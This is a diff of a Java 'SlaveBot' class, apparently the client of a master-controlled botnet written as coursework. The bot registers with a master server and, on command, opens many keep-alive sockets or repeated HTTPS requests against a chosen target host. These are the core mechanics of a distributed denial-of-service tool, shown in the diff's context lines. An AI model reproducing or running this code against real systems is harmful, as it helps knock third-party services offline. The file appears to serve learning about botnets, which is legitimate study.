@@ -1,12 +1,9 @@
-package bot;
+//package bot;
 
 import java.io.*;
 import java.net.*;
 import java.util.*;
 import java.util.Map.Entry;
-
-
-
 
 
 
@@ -44,9 +41,7 @@ public class SlaveBot implements Runnable {
 			}        
 		}
 		catch (Exception e){
-			System.out.println("could not accept the master data");
-			//System.exit(-1);
-			//System.out.println(e);
+			System.out.println("could not accept the user data");
 		}
 	}
 
@@ -70,7 +65,7 @@ public class SlaveBot implements Runnable {
 
 		if (action.contentEquals("connect")){
 			String uniqueKey = concatinatedData(targetHostName, targetPortNumber);
-			// go create a object and insert into the hash table value first time
+			// create an object and insert into the hash table value first time
 			targetData targetObj;
 
 			if (targetDataMap.containsKey(uniqueKey) == false)
@@ -115,9 +110,6 @@ public class SlaveBot implements Runnable {
 			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
 			Integer slavePort_int = client_socket.getLocalPort();
 			String local_host = client_socket.getInetAddress().getHostAddress();
-
-			//System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm
-
 			out.println(ip +","+ slavePort_int + "," + local_host);
 			return slavePort_int;
 
@@ -137,7 +129,6 @@ public class SlaveBot implements Runnable {
 		Integer portInt = Integer.parseInt(port);
 		targetData obj = targetDataMap.get(conKey);
 
-		//obj.arrSoc = new Socket[numConnectionInt];	
 		if(keepAliveOrUrl.contentEquals("keepalive")){
 			if (targetDataMap.containsKey(conKey)){
 				try{
@@ -145,7 +136,6 @@ public class SlaveBot implements Runnable {
 						Socket socObj = new Socket(ip, portInt);
 						socObj.setKeepAlive(true);
 						obj.arrSoc.add(socObj);
-						//obj.arrSoc[i] = new Socket(ip, portInt);
 						System.out.println("Connected to the target");
 					}
 					listMap();
@@ -174,43 +164,31 @@ public class SlaveBot implements Runnable {
 			}
 			System.out.println("The url to connect is " + completeUrl);
 			try{
-				String str = completeUrl.toString();
-				URL url = new URL("https://" + str);
+				URL url = new URL("https://" + completeUrl.toString());
 				connection = (HttpURLConnection) url.openConnection();
 				connection.setRequestMethod("GET");
-				int responseCode = connection.getResponseCode();
-				System.out.println("Response Code : " + responseCode);
-				//connection.setRequestProperty("Accept", "application/json");
+				//int responseCode = connection.getResponseCode();
+				//System.out.println("Response Code : " + responseCode);
 
 				if (connection.getResponseCode() != 200) {
 					throw new RuntimeException("Failed : HTTP error code : "
 							+ connection.getResponseCode());
 				}
-
 				BufferedReader br = new BufferedReader(new InputStreamReader(
-					(connection.getInputStream())));
-
-				String output;
-				System.out.println("Output from Server .... \n");
-				while ((output = br.readLine()) != null) {
-					System.out.println(output);
-				}
-
+						(connection.getInputStream())));
 				connection.disconnect();
 
-			  } catch (MalformedURLException e) {
+			} catch (MalformedURLException e) {
 
 				e.printStackTrace();
 
-			  } catch (IOException e) {
+			} catch (IOException e) {
 
 				e.printStackTrace();
 
-			  }
-
+			}
+			listMap();
 		}
-
-		//System.out.println("total sockets" + obj.arrSoc.size());
 	}
 
 
@@ -252,19 +230,17 @@ public class SlaveBot implements Runnable {
 				}
 				catch(Exception e){
 					//System.out.println("Something went wrong");
-					System.exit(-1);
 				}
 			}
 		}
 	}
 
 	public static void listMap(){
-		//	Set set = slaveDataMap.entrySet();
 		Iterator<Entry<String, targetData>> iter = targetDataMap.entrySet().iterator();
 		while (iter.hasNext()) {
 			Entry<String, targetData> entry = iter.next();
 			targetData localObj = entry.getValue();
-			System.out.print(localObj.targetHost + "\t" + localObj.port + "\t" + localObj.arrSoc + "\n");
+			System.out.print(localObj.targetHost + "\t" + localObj.port + "\t" + localObj.arrSoc.toString()+ "\n");
 
 		}
 	}
@@ -272,7 +248,7 @@ public class SlaveBot implements Runnable {
 	public static void main(String[] args) throws Exception {
 		if(args.length != 4)
 		{
-			//System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
+			System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
 			System.exit(0);
 		}
 
@@ -281,12 +257,6 @@ public class SlaveBot implements Runnable {
 		slaveListenPort = registerSlave(hostname, masterport);
 		slavePort = new ServerSocket(slaveListenPort);
 		new Thread(new SlaveBot()).start();
-
-		for (Map.Entry<String, targetData> entry : targetDataMap.entrySet()) {
-			//System.out.println(entry.getKey() +" : " +entry.getValue().action + " : "+ entry.getValue().targetHost + " : " + entry.getValue().port + " : " + entry.getValue().numConnections);
-			//System.out.println("\nFor the key : " + entry.getKey() + "The array saved is" + entry.getValue().arrSoc);
-		}
-
 
 	}	
 
